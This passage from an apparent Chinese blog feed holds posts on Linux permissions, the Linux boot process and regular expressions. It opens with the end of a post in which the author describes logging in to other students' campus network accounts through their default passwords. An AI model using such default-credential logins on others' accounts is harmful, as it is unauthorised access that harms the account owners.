&lt;p&gt;显示的帐号都是用的默认密码的。返回的 response 结果中&lt;code&gt;status_error&lt;/code&gt; 表示没充钱，&lt;code&gt;ip_exist_error&lt;/code&gt;表示 IP 尚未下线。显示一串数字的就是可以直接登录的了！记得把帐号还给人家。&lt;/p&gt;
&lt;p&gt;虽然最后还是没有下到论文，不过作为程序猿能把自己的想法用所学的实现了想想还是有些小激动的。&lt;/p&gt;
&lt;p&gt;PS：发现研究生不改密码的比本科生还多，为什么呢？&lt;/p&gt;
&lt;p&gt;-EOF-&lt;/p&gt;
</content>
    
    <summary type="html">
    
      昨天同学让我帮忙下篇论文，发现自己的校内上网帐号有一段时间没充值了。登录校园网才能下论文，无奈问了周围的人却发现都没充值！（实验室可以免费上网大家都不充值了么）。懒得去充值，就想会不会有的上网帐号还是用的默认密码？如果有的话，岂不是可以“借来”用一下！虽然有些不道德，但是为了验证心里的想法还是忍不住下手了。
    
    </summary>
    
      <category term="Python" scheme="http://wuchong.me/categories/Python/"/>
    
    
      <category term="Python" scheme="http://wuchong.me/tags/Python/"/>
    
      <category term="模拟登录" scheme="http://wuchong.me/tags/%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>Linux基础：权限与文件</title>
    <link href="http://wuchong.me/blog/2014/07/15/linux-permission-and-file/"/>
    <id>http://wuchong.me/blog/2014/07/15/linux-permission-and-file/</id>
    <published>2014-07-15T05:15:25.000Z</published>
    <updated>2016-03-08T12:15:02.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;用户与用户组&quot;&gt;&lt;a href=&quot;#用户与用户组&quot; class=&quot;headerlink&quot; title=&quot;用户与用户组&quot;&gt;&lt;/a&gt;用户与用户组&lt;/h2&gt;&lt;p&gt;Linux 是一个多用户、多任务的系统，常常有多人同时使用一台机工作，为了保护每个人的隐私权，“文件所有者”的角色就显得相当重要了。&lt;/p&gt;
&lt;p&gt;当Linux用户登录系统之后，就会携带一个用户身份（User ID，UID）和一个用户组身份（Group ID，GID），相当于自己的名片。当需要访问文件或程序时，刷一下名片就能知道是否能读、写、执行了。&lt;/p&gt;
&lt;p&gt;一般来说，Linux的用户信息保存在&lt;code&gt;/etc/passwd&lt;/code&gt;中，组信息保存在&lt;code&gt;/etc/group&lt;/code&gt;中，文件的每一行代表一个用户/组。早期的Linux将密码以明文的形式保存在&lt;code&gt;/etc/passwd&lt;/code&gt;中，而现在则多以暗码(也就是加密之后的形式)的形式保存在&lt;code&gt;/etc/shadow&lt;/code&gt;中。将密码存储在&lt;code&gt;/etc/shadow&lt;/code&gt;中提高了密码的安全性，因为&lt;code&gt;/etc/passwd&lt;/code&gt;允许所有人查看，而&lt;code&gt;/etc/shadow&lt;/code&gt;只允许root用户查看。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;文件属性&quot;&gt;&lt;a href=&quot;#文件属性&quot; class=&quot;headerlink&quot; title=&quot;文件属性&quot;&gt;&lt;/a&gt;文件属性&lt;/h2&gt;&lt;p&gt;要了解Linux的权限控制就必须学习Linux的文件权限和属性。可以用ls命令查询文件信息（&lt;code&gt;$ls -l&lt;/code&gt;），得到如下结果：&lt;br&gt;&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ ls -l  ~/&lt;span class=&quot;selector-tag&quot;&gt;input&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;总用量 &lt;span class=&quot;number&quot;&gt;36&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;drwxrwxr-x   &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;   wuchong wuchong  &lt;span class=&quot;number&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;月 &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;21&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;45&lt;/span&gt; ./&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;drwxr-xr-x   &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;  wuchong wuchong  &lt;span class=&quot;number&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;月 &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;08&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;58&lt;/span&gt; ../&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-rw-rw-r--   &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;   wuchong wuchong  &lt;span class=&quot;number&quot;&gt;46&lt;/span&gt;   &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;月 &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;31&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.txt&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;lrwxrwxrwx   &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;   wuchong wuchong  &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;    &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;月 &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.txt&lt;/span&gt; -&amp;gt; &lt;span class=&quot;selector-tag&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.txt&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[  权限  ][连接数][拥有者][用户组][文件容量][ 修改日期 ] [文件名]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;我们以 a.txt 文件为例介绍各个部分的含义：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;第一列代表文件权限。它由十个字符组成。首先介绍第一个字符的&lt;code&gt;-&lt;/code&gt;，它表示文件类型，说明 a.txt 是常规文件(如果是目录文件则应显示 d，如果是 l 则是软链接文件)。随后有九个字符，为&lt;code&gt;rw-rw-r--&lt;/code&gt;，它们用于表示文件权限。这九个字符分为三组，&lt;code&gt;rw-&lt;/code&gt;,&lt;code&gt;rw-&lt;/code&gt;, &lt;code&gt;r--&lt;/code&gt;，分别对应拥有者(owner)，所属用户组(owner group)和所有其他人(other)。回顾  &lt;a href=&quot;http://wuchong.me/blog/2014/07/14/linux-boot-process/&quot;&gt;Linux 的启动流程&lt;/a&gt;，登录后，我们会有一个用户身份和一个组身份, 相当于我的身份证。第一组表示，如果我的身份证上的用户身份证明我是该文件的拥有者，那么我就可以对该文件有读取(r)，写入(w)该文件的权限，但不拥有执行(x)该文件的权限。如果不拥有某项权限，会在对应的位置上出现减号(-)。第二组表示，如果我的名片上的组身份证明我所在的组是该文件的所属用户组的一员，那么我有从该文件读入和写入的权限。第三组表示，如果我的名片显示我既不是拥有者，也不是拥有组的一员，那么我只有读入的权限。当我想要进行一个读取操作时，Linux会先看我是否是拥有者。&lt;/li&gt;
&lt;li&gt;第二列代表有多少文件名连接到此节点（i-node）。每个文件都将它的权限和属性记录到文件系统的 inode 中，不过文件名却是存放在目录文件中的。因此会有多个文件名连接到一个 inode 的情况，这就是硬链接，而该列就是指的硬链接数。&lt;/li&gt;
&lt;li&gt;第三列表示这个文件（或目录）的拥有者。&lt;/li&gt;
&lt;li&gt;第四列表示这个文件（或目录）的所属用户组。&lt;/li&gt;
&lt;li&gt;第五列表示这个文件的大小，单位为字节（byte）。其中软链接文件（上面的 b.txt 文件）的大小正好是目标文件的字符数。至于目录也是一种文件，有趣的是大部分目录所占的大小都是 1K、2K、4K 的倍数。&lt;/li&gt;
&lt;li&gt;第六列表示文件的最近修改时间。其实文件属性中还包括创建时间和最近读取时间，只是并未显示出来。&lt;/li&gt;
&lt;li&gt;第七列为该文件的文件名。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;改变文件属性和权限&quot;&gt;&lt;a href=&quot;#改变文件属性和权限&quot; class=&quot;headerlink&quot; title=&quot;改变文件属性和权限&quot;&gt;&lt;/a&gt;改变文件属性和权限&lt;/h2&gt;&lt;p&gt;我们已经知道文件权限对于一个系统的重要性了，但如何对文件的属性和权限进行修改呢？这里主要用到三个命令：&lt;code&gt;chgrp&lt;/code&gt;、&lt;code&gt;chown&lt;/code&gt;、&lt;code&gt;chmod&lt;/code&gt;，分别对应修改用户组、拥有者和文件权限。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;改变所属用户组：chgrp&lt;/p&gt;
&lt;figure class=&quot;highlight elixir&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$ &lt;/span&gt;chgrp 组名  文件或目录&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$ &lt;/span&gt;chgrp users a.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;改变文件所有者：chown&lt;/p&gt;
&lt;figure class=&quot;highlight elixir&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$ &lt;/span&gt;chown 账号名称 文件或目录&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$ &lt;/span&gt;chown 账号名称&lt;span class=&quot;symbol&quot;&gt;:&lt;/span&gt;组名 文件或目录&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$ &lt;/span&gt;chown &lt;span class=&quot;symbol&quot;&gt;root:&lt;/span&gt;root a.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;改变文件权限：chmod&lt;br&gt;Linux中的每种身份（own、group、other）拥有一个权限三元组（rwx）。每一个权限组可以用一个三位的二进制来表示，拥有对应权限的则在相应位上置1。例如&lt;code&gt;-rw-rw-r--&lt;/code&gt;即代表 664 的意思。如果我们想将该文件改成&lt;code&gt;-rwxrwx---&lt;/code&gt;的权限，就将其权限分数改成 770 即可。&lt;/p&gt;
&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ chmod &lt;span class=&quot;number&quot;&gt;770&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.txt&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ ls -l &lt;span class=&quot;selector-tag&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.txt&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-rwxrwx---  &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; root root &lt;span class=&quot;number&quot;&gt;46&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;月 &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;31&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;a&lt;/span&gt;.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;默认权限umask&quot;&gt;&lt;a href=&quot;#默认权限umask&quot; class=&quot;headerlink&quot; title=&quot;默认权限umask&quot;&gt;&lt;/a&gt;默认权限umask&lt;/h2&gt;&lt;p&gt;当我们创建文件的时候，比如使用&lt;code&gt;touch&lt;/code&gt;，它会尝试将新建文件创建为权限666，也就是 rw-rw-rw-。但操作系统要参照权限 mask 来看是否真正将文件创建为666。权限 mask 表示操作系统不允许设置的权限位，比如说037(—-wxrwx)的权限  mask 意味着不允许设置设置 group 的 wx 位和 other 的 rwx 位。如果是这个权限 mask 的话，最终的文件权限是 rw-r—– ( group 的 w 位和 other 的 rw 位被 mask )。&lt;/p&gt;
&lt;p&gt;我们可以通过&lt;br&gt;&lt;figure class=&quot;highlight xquery&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$umask &lt;span class=&quot;number&quot;&gt;022&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;的方式改变权限mask。仅输入&lt;code&gt;umask&lt;/code&gt;是查询默认 mask 的意思。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;Linux 中的权限管理非常复杂，尤其是涉及进程的时候，有时会有权限的切换。这部分待到以后再说。不过Linux的权限管理都是基于文件的属性和权限的，因此学习了解 Linux 的文件系统非常重要。&lt;/p&gt;
&lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://book.douban.com/subject/4889838/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;鸟哥的Linux私房菜.基础学习篇&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      Linux 是一个多用户、多任务的系统，多用户之间的权限是通过 user、group、other 三种身份管理的。而权限又与文件密不可分，所以将这两块结合起来阐述了。
    
    </summary>
    
      <category term="Linux/Unix" scheme="http://wuchong.me/categories/Linux-Unix/"/>
    
    
      <category term="Linux基础" scheme="http://wuchong.me/tags/Linux%E5%9F%BA%E7%A1%80/"/>
    
      <category term="权限" scheme="http://wuchong.me/tags/%E6%9D%83%E9%99%90/"/>
    
  </entry>
  
  <entry>
    <title>Linux基础：启动流程</title>
    <link href="http://wuchong.me/blog/2014/07/14/linux-boot-process/"/>
    <id>http://wuchong.me/blog/2014/07/14/linux-boot-process/</id>
    <published>2014-07-14T02:15:05.000Z</published>
    <updated>2016-03-08T12:14:15.000Z</updated>
    
    <content type="html">&lt;p&gt;计算机的启动是一个非常复杂的过程，从打开电源到桌面的显示，需要经过一系列不可或缺的过程，了解这些过程有助于我们更好地理解操作系统，也有助于我们修复系统可能出现的问题。&lt;/p&gt;
&lt;p&gt;##0. 启动流程一览&lt;br&gt;我们先给出 Linux 启动流程的总览图，然后再每一个模块展开说明。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/large/81b78497jw1eic3rqn72tj20hf06774l.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;1-BIOS&quot;&gt;&lt;a href=&quot;#1-BIOS&quot; class=&quot;headerlink&quot; title=&quot;1. BIOS&quot;&gt;&lt;/a&gt;1. BIOS&lt;/h2&gt;&lt;p&gt;当我们按下电源按键后，计算机硬件会自动读取主板上的BIOS（Basic Input/Output System）来加载硬件信息以及硬件系统的自我测试。BIOS也是一套程序，它知道如何与硬件进行交互。BIOS首先会对硬件进行检查，判断计算机硬件是否能满足运行的基本条件，这叫做“硬件自检”（Power-On Self-Test，简称 POST）。&lt;/p&gt;
&lt;p&gt;硬件自检后，BIOS 会将控制权交给下一段启动程序。这时，BIOS需要知道，”下一阶段的启动程序”具体存放在哪一个设备。也就是说，BIOS需要有一个外部存储设备的排序，排在前面的设备就是优先转交控制权的设备。这种排序叫做”启动顺序”（Boot Sequence）。&lt;/p&gt;
&lt;p&gt;因此，BIOS按照”启动顺序”，把控制权转交给排在第一位的存储设备。&lt;/p&gt;
&lt;h2 id=&quot;2-MBR&quot;&gt;&lt;a href=&quot;#2-MBR&quot; class=&quot;headerlink&quot; title=&quot;2. MBR&quot;&gt;&lt;/a&gt;2. MBR&lt;/h2&gt;&lt;p&gt;系统读取位列第一的可启动存储设备。计算机先读取该设备的第一个扇区，也就是读取最前面的512个字节。这最前面的512个字节，就叫做”主引导记录”（Master boot record，缩写为MBR）。MBR 只有512字节，放不了太多东西，它主要告诉计算机从该设备的哪一个分区（partition）来装载引导加载程序（boot loader）。Boot Loader 储存有操作系统（OS）的相关信息，比如操作系统名称，操作系统内核（kernel）所在位置等。它的主要功能就是加载内核到内存中去执行。常用的 boot loader 有 GRUB 和 LILO 。&lt;/p&gt;
&lt;p&gt;那我们经常说到的多操作系统是怎么回事呢？其实每个文件系统（或分区）的最前面会保留一个引导扇区（boot selector），这个引导扇区可以安装 boot loader。这样我们在每个 boot loader 中对应不同的操作系统，在读取 MBR 的时候选择我们需要启动的 boot loader 即可。&lt;/p&gt;
&lt;h2 id=&quot;3-kernel&quot;&gt;&lt;a href=&quot;#3-kernel&quot; class=&quot;headerlink&quot; title=&quot;3. kernel&quot;&gt;&lt;/a&gt;3. kernel&lt;/h2&gt;&lt;p&gt;随后，boot loader 会帮助我们加载内核，内核就会开始检测硬件与加载驱动程序。没错，内核会以自己的功能重新检测一遍硬件，而不一定会使用 BIOS 检测到的硬件信息。也就是说，内核此时才开始接管 BIOS 后的工作。&lt;/p&gt;
&lt;p&gt;Kernel 实际上是一个用来操作计算机的程序，它是计算机操作系统的内核，主要的任务是管理计算机的硬件资源，充当软件和硬件的接口。操作系统上的任何操作都要通过 kernel 传达给硬件。&lt;/p&gt;
&lt;h2 id=&quot;4-init-process&quot;&gt;&lt;a href=&quot;#4-init-process&quot; class=&quot;headerlink&quot; title=&quot;4. init process&quot;&gt;&lt;/a&gt;4. init process&lt;/h2&gt;&lt;p&gt;在内核加载完毕以后，此时内核会主动调用第一个进程，那就是 &lt;code&gt;/sbin/init&lt;/code&gt;，它的作用就是初始化系统环境。使用&lt;code&gt;pstree&lt;/code&gt;命令会发现init的进程编号（PID）是1，也就是说init是第一个运行的程序，其他所有进程都从它衍生，都是它的子进程。&lt;/p&gt;
&lt;p&gt;许多程序需要开机启动。它们在Windows叫做”服务”（service），在 Linux 就叫做”守护进程”（daemon）。&lt;/p&gt;
&lt;p&gt;init 进程的一大任务，就是去运行这些开机启动的程序。但是，不同的场合需要启动不同的程序，比如用作服务器时，需要启动 Apache，用作桌面就不需要。Linux 允许为不同的场合，分配不同的开机启动程序，这就叫做”运行级别”（run level）。也就是说，启动时根据”运行级别”，确定要运行哪些程序。&lt;/p&gt;
&lt;p&gt;基本上，依据有无网络与有无 X Window ，Linux 将 run level 划分为7个等级（0-6）。其中0是关机，1是单用户模式，6是重启。而 2-5，一般来说都是多用户模式。&lt;/p&gt;
&lt;p&gt;Linux 在启动各个服务前会先执行一系列的初始脚本（rc.sysinit）。这些脚本执行如下功能：设置计算机名称，时区，检测文件系统，挂载硬盘，清空临时文件，设置网络……&lt;br&gt;之后会根据运行级别的不同，系统会运行 rc0.d 到 rc6.d 目录中的相应的脚本程序，来完成相应的初始化工作和启动相应的服务。rc*.d目录中存放的是该运行级别中需要执行的服务脚本的软链接文件（即快捷方式）。&lt;/p&gt;
&lt;p&gt;除此之外，Linux 还会运行一些其他的初始脚本。运行完后，操作系统已经完全准备好了，只是，还没有人可以登录！！！init 会给出登录（login）对话框，或者是图形化的登录界面。&lt;/p&gt;
&lt;h2 id=&quot;5-login&quot;&gt;&lt;a href=&quot;#5-login&quot; class=&quot;headerlink&quot; title=&quot;5. login&quot;&gt;&lt;/a&gt;5. login&lt;/h2&gt;&lt;p&gt;输入用户名密码登录成功后，系统会为用户分配一个用户 ID（UID），和一个组 ID（GID）。这两个 ID 就好像身份证一样会一直伴随用户，用于检测用户执行程序时的身份验证。&lt;/p&gt;
&lt;p&gt;当用户登录成功后，一个完整的操作系统就展现在用户的面前了。哈哈！&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;结合一开始给出的流程图，Linux 的启动流程可以概括为以下几个主要步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;加载 BIOS 的硬件信息与硬件自检，并依据设置取得第一个可启动的设备；&lt;/li&gt;
&lt;li&gt;读取并执行第一个启动设备内的MBR的 boot loader；&lt;/li&gt;
&lt;li&gt;依据 boot loader 的设置加载内核，内核会开始检测硬件与加载驱动程序；&lt;/li&gt;
&lt;li&gt;在内核 Kernel 加载完毕后，Kernel  会主动调用 init 进程，而 init 会取得 run-level 信息；&lt;/li&gt;
&lt;li&gt;init 执行 rc.sysinit 初始化系统的操作环境（网络、时区等）；&lt;/li&gt;
&lt;li&gt;init 启动 run-level 的各个服务；&lt;/li&gt;
&lt;li&gt;用户登录&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;要注意在一开始的流程图中 init 虽然只用了一个模块展现出来，但其实在启动过程中 init 占了很大的比重。&lt;/p&gt;
&lt;h2 id=&quot;参考文献&quot;&gt;&lt;a href=&quot;#参考文献&quot; class=&quot;headerlink&quot; title=&quot;参考文献&quot;&gt;&lt;/a&gt;参考文献&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.ruanyifeng.com/blog/2013/08/linux_boot_process.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux 的启动流程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.ruanyifeng.com/blog/2013/02/booting.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;计算机是如何启动的？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.cnblogs.com/vamei/archive/2012/09/05/2672039.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux开机启动 (bootstrap) &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://vbird.dic.ksu.edu.tw/linux_basic/linux_basic.php&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;鸟哥的Linux私房菜.基础学习篇&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      计算机的启动是一个非常复杂的过程，从打开电源到桌面的显示，需要经过一系列不可或缺的过程，了解这些过程有助于我们更好地理解操作系统，也有助于我们修复系统可能出现的问题。
    
    </summary>
    
      <category term="Linux/Unix" scheme="http://wuchong.me/categories/Linux-Unix/"/>
    
    
      <category term="Linux基础" scheme="http://wuchong.me/tags/Linux%E5%9F%BA%E7%A1%80/"/>
    
      <category term="启动流程" scheme="http://wuchong.me/tags/%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式学习</title>
    <link href="http://wuchong.me/blog/2014/07/02/learn-regular-expressions/"/>
    <id>http://wuchong.me/blog/2014/07/02/learn-regular-expressions/</id>
    <published>2014-07-02T09:43:45.000Z</published>
    <updated>2016-03-08T12:14:00.000Z</updated>
    
    <content type="html">&lt;p&gt;最近在看鸟哥 Linux，看到正则表达式这块，以前看到这些恐怖的字符总是觉得恶心，今天就咬牙系统的学习了下正则表达式。然后有了这篇笔记。主要总结正则表达式的一些关键知识点。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;字面值：&lt;code&gt;a b c d 1 2 3 4&lt;/code&gt; 等等。&lt;/li&gt;
&lt;li&gt;字符类：&lt;code&gt;. [abc] [a-z] \d \w \s&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.&lt;/code&gt; 表示“任何字符”&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[abc]&lt;/code&gt;  括号表示“找到集合里任意一个字符”。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\d&lt;/code&gt; 表示“一个数字”，等同于&lt;code&gt;[0-9]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\w&lt;/code&gt; 表示“一个单词字符”，等同于&lt;code&gt;[0-9A-Za-z_]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\s&lt;/code&gt; 表示“一个空格，tab，回车或一个换行符”&lt;/li&gt;
&lt;li&gt;否定字符类：&lt;code&gt;[^abc] \D \W \S&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;乘法器：&lt;code&gt;{4} {3,16} {1,} ? * +&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;{3,16}&lt;/code&gt; 表示找到重复 3 到 16 个前一个正则字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;?&lt;/code&gt; 表示“没有或一个”&lt;/li&gt;
&lt;li&gt;&lt;code&gt;*&lt;/code&gt; 表示“没有或多个”&lt;/li&gt;
&lt;li&gt;&lt;code&gt;+&lt;/code&gt; 表示“一个或多个”&lt;/li&gt;
&lt;li&gt;乘法器是贪婪的除非你在之后使用 &lt;code&gt;?&lt;/code&gt; , 即优先找到最长的&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;分支和组合：  &lt;code&gt;(Septem|Octo|Novem|Decem)ber&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;管道符号 &lt;code&gt;|&lt;/code&gt; 表示“或”&lt;/li&gt;
&lt;li&gt;圆括号表示组合 ，比如 在一周中找到一天，使用 &lt;code&gt;(Mon|Tues|Wednes|Thurs|Fri|Satur|Sun)day&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;词、行和文本边界： &lt;ul&gt;
&lt;li&gt;&lt;code&gt;\b&lt;/code&gt; 表示词边界  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;^&lt;/code&gt; 表示行开始 &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$&lt;/code&gt; 表示行结束&lt;/li&gt;
&lt;li&gt;&lt;code&gt;^$&lt;/code&gt; 表示的就是空白行了&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;反向捕获组：&lt;code&gt;\1 \2 \3&lt;/code&gt; 等等。捕获组从左到右进行编号，只要计算左圆括号。（在替换表达式和匹配表达式中同时生效） &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;比如有一段字符，我们需要前面的横杠去掉，尾巴的数字去掉， 英文句号换成中文顿号&lt;/p&gt;
&lt;figure class=&quot;highlight haml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-&lt;span class=&quot;ruby&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;.文章标题&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;-&lt;span class=&quot;ruby&quot;&gt;&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;.文章标题&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;-&lt;span class=&quot;ruby&quot;&gt;&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;.文章标题&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;-&lt;span class=&quot;ruby&quot;&gt;&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;.文章标题&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;-&lt;span class=&quot;ruby&quot;&gt;&lt;span class=&quot;number&quot;&gt;51&lt;/span&gt;.文章标题&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
